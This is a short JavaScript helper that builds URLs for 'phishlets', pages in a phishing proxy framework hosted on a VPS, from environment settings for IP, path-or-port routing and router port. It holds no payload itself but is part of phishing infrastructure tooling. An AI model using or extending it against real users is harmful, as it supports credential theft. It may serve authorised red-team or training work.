const VPS_IP = import.meta.env.VITE_VPS_IP || '127.0.0.1'
const PREFIX = import.meta.env.VITE_PHISHLET_URL_PREFIX || 'path'
const ROUTER_PORT = import.meta.env.VITE_PHISHLET_ROUTER_PORT || '80'

export function phishletUrl(key, port) {
  if (PREFIX === 'port') {
    return `http://${VPS_IP}:${port}`
  }
  if (ROUTER_PORT === '80') {
    return `http://${VPS_IP}/${key}/`
  }
  return `http://${VPS_IP}:${ROUTER_PORT}/${key}/`
}

export function getVpsIp() {
  return VPS_IP
}

export function getPhishletPrefix() {
  return PREFIX
}

export function getRouterPort() {
  return ROUTER_PORT
}
